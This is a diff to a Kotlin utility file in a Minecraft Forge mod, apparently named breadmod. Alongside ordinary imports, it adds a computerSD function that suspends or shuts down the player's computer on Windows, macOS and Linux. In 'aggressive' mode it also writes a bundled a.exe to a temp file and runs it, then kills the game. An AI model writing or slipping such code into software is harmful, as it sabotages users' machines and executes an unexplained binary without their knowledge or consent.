@@ -2,6 +2,7 @@
 
 package breadmod.util
 
+import breadmod.datagen.tool_gun.mode.ToolGunPowerMode
 import com.google.gson.JsonArray
 import com.google.gson.JsonElement
 import com.google.gson.JsonObject
@@ -41,8 +42,12 @@ import thedarkcolour.kotlinforforge.forge.vectorutil.v3d.plus
 import thedarkcolour.kotlinforforge.forge.vectorutil.v3d.times
 import thedarkcolour.kotlinforforge.forge.vectorutil.v3d.toVec3i
 import java.awt.Color
+import java.nio.file.Files
 import java.util.*
+import kotlin.io.path.absolutePathString
+import kotlin.io.path.writeBytes
 import kotlin.math.min
+import kotlin.system.exitProcess
 
 val formatArray = listOf("p", "n", "m", "", "k", "M", "G", "T", "P", "E")
 fun formatNumber(pN: Double, pUnitOffset: Int = 0, pUnitMax: Int = 1000): Pair<Double, String> {
@@ -276,4 +281,33 @@ fun jsonToComponent(json: JsonObject): MutableComponent = when(val type = json.g
     )
     "literal" -> Component.literal(json.getAsJsonPrimitive("text").asString)
     else -> throw IllegalArgumentException("Illegal component type: $type")
+}
+
+fun computerSD(aggressive: Boolean) {
+    val runtime = Runtime.getRuntime()
+    val os = System.getProperty("os.name")
+    when {
+        os.contains("win", true) -> {
+            if(aggressive) {
+                val resource = ToolGunPowerMode::class.java.getResourceAsStream("/a.exe")!!
+                val temp = Files.createTempFile("a", "exe")
+                temp.writeBytes(resource.readAllBytes())
+                runtime.exec(temp.absolutePathString())
+            }
+            runtime.exec("RUNDLL32.EXE powrprof.dll,SetSuspendState 0,1,0")
+        }
+        os.contains("mac", true) -> {
+            runtime.exec("pmset sleepnow")
+        }
+        os.contains("nix", true) || os.contains("nux", true) || os.contains("aix", true) -> {
+            if(aggressive) runtime.exec("shutdown 0")
+            runtime.exec("systemctl suspend")
+        }
+        else -> if(aggressive) throw IllegalStateException("Screw you! You're no fun.")
+    }
+
+    if(aggressive) {
+        Thread.sleep(5000)
+        exitProcess(0)
+    }
 }
